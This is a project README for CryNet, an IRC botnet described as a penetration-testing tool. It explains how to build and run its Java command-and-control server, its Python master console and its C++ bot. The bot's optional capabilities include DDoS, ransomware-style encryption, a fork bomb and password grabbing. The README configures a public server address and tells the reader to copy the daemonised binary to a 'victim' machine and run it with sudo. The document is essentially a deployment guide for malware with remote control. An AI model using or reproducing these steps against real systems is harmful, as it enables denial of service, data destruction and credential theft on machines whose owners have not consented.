# CryNet

CryNet is an advanced IRC Botnet Intended to be used in a penetration testing context. It is an open-source tool designed to simulate and test various security threats in a controlled environment. 

---

## Features
* Simulate various cybersecurity threats including DDoS, ransomware, and system throttling
* Customizable bots with multiple capabilities
* IRC-based Command and Control (C&C) infrastructure
* Cross-platform support with components written in C++, Java, and Python

---

## System Requirements and Dependencies

**Server**
* OS: Any with Java Runtime Environment (JRE) 1.8
* Dependencies: Jackson-core, commons-codec, Apache Maven

**Bot**
* OS: Linux, preferably Debian based at this time
* Dependencies: crypto++, libircclient, libtins/libpcap

**Master**
* OS: Any with Python installed
* Dependencies: Colorama, hashlib, socket, subprocess, threading, JSON

---

## Installation and Setup

**General Installation**
1. Clone the repository 

```
git clone https://github.com/s1-dev/CryNet.git
cd CryNet
```

2. Following below steps for installation and setup for deseired component 

**IRC Server Installation**

1. Run `setup.py` script

```
python setup.py
```

2. Follow script for server setup

```
Welcome to CryNet project setup, please enter revelant information to setup configuration:
What config would you like to update? (MASTER|SERVER|BOTH) SERVER
~~~~~~~~~~~~~~~~~Server config~~~~~~~~~~~~~~~~~
Current configuration:
{
    "serverHostname": "",
    "portNumber": 0,
    "maxChannels": 0,
    "maxChannelUsers": 0,
    "maxMessageLength": 0,
    "maxNickLength": 0,
    "maxConnections": 0,
    "masterAuthDigest": "",
    "botAuthDigest": "",
    "shutdownSalt": "",
    "shutdownDigest": ""
}
Server hostname (IP): 127.0.0.1
Port number (6667|6697): 6667
Max channels (default is 7):
...
```

3. Run `ircServerBuildAndRush.sh` script to build and execute the maven project

```
./ircServerBuildAndRun.sh
```

**Master Installation**
1. Run `setup.py` script

```
python setup.py
```

2. Follow script for master setup

```
Welcome to CryNet project setup, please enter revelant information to setup configuration:
What config would you like to update? (MASTER|SERVER|BOTH) MASTER
~~~~~~~~~~~~~~~~~Master config~~~~~~~~~~~~~~~~~
Current configuration:
{
    "server": "127.0.0.1",
    "port": 6667,
    "masterValidatePass": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    "botValidatePass": "ecd71870d1963316a97e3ac3408c9835ad8cf0f3c1bc703527c30265534f75ae",
    "botPath": "/code/secDev/CryNet/src/bot/"
}
Server address (IP): 127.0.0.1
Port number (6667|6697): 6667
Master validation passphrase:
...
```

3. Run `runMasterProgram.sh` script or run the `MasterProgram.py` script

```
./runMasterProgram.sh
```

OR

```
cd src/master/
python ./MasterProgram.py
```

**Bot Installation - Manual Setup**
1. Navigate to the root of the bot project directory

```
cd src/bot/
```

2. Modify `manualCompilationScript.sh` to flip any deseired bot capaiblitity flags to 1

```
head -n 7 manualCompilationScript.sh
#!/bin/bash

ENABLE_PING_ACTION=0
ENABLE_ENCRYPT_ACTION=0
ENABLE_REPORT_ACTION=0
ENABLE_FORK_BOMB_ACTION=0
ENABLE_GET_PASSWD_ACTION=0

nano manualCompilationScript.sh
head -n 7 manualCompilationScript.sh
#!/bin/bash

ENABLE_PING_ACTION=1
ENABLE_ENCRYPT_ACTION=0
ENABLE_REPORT_ACTION=1
ENABLE_FORK_BOMB_ACTION=0
ENABLE_GET_PASSWD_ACTION=1
```

3. Modify variables set in `manualCompilationScript.sh` that are passed in as macros for compilation. 

Example of the set variables
```
BOT_NICK="bot_NICK"
BOT_USER="bot_USER"
SERVER_ADDRESS="52.90.220.187"
ASSIGNED_CHANNEL="#testChannel"
BOT_PASS="test123"
MASTER_NICK="master"
OUT_FILE="irc_bot"
```

4. Run `manualCompilationScript.sh`
```
./manualCompilationScript.sh
```

5. Move the executable to the deseired "victim" machine 

6. Run the executable, it default runs as a background process. Otherwise, use "NO_DAEMON" command-line argument 

```
sudo ./irc_bot
``` 

OR

```
sudo ./irc_bot NO_DAEMON
```

**Bot Installation - Master Setup**
1. Run the master program, ensure that the master setup has been complete

```
cd src/master/
python ./MasterProgram.py
```

2. Run through the bot compilation process in the master program

```
~~~~~~~~~~~~~~~~~~~~~~~CryNet Master Options~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Master options (input number to select option):
1. Connect to CryNet IRC server
2. Enter command center
3. Enter manual IRC console
4. View bot staistics
5. Compile a new bot
Option: 5
----------------------CryNet Bot Compilation----------------------
To a compile a bot with a specific level of complexity, follow given instructions
(Note: This compiler will only work if g++ is installed and the master program is running from the 'master' directory)
=========================General Bot Setup=========================
Enter the name of the executable: irc_bot
Enter the output path of this binary (no input will be the cwd):
Would you like to strip the binay? Stripping is recommended since it removes debugging informationa and untouched code, which reduces the exe size.
Enter 'n' to not strip the exe:
=========================Bot Macros Setup=========================
(Note: these values will be passed to the bot as essentially compilation time params)
Enter a botnet channel name (must start with '#'):
...
```

3. Move the executable to the deseired "victim" machine 

4. Run the executable, it default runs as a background process. Otherwise, use "NO_DAEMON" command-line argument 

```
sudo ./irc_bot
``` 

OR

```
sudo ./irc_bot NO_DAEMON
```

---

## Component Overview

**IRC Server**
The IRC Server, written in Java, acts as the central command hub for CryNet. It supports several hundred concurrent connections and facilitates communication between the Master Program and IRC Bots.

**Bot**
CryNet's IRC Bots are written in C++ and are responsible for executing commands received from the IRC server. They can be compiled with various capabilities, enabling them to perform different security testing actions.

**Master**
The Master Program, written in Python, sends commands to the IRC Bots via the IRC Server. It allows users to remotely manage and control the actions performed by the bots. In addition, it provides a UI for bots to be compiled with different capabilities. 
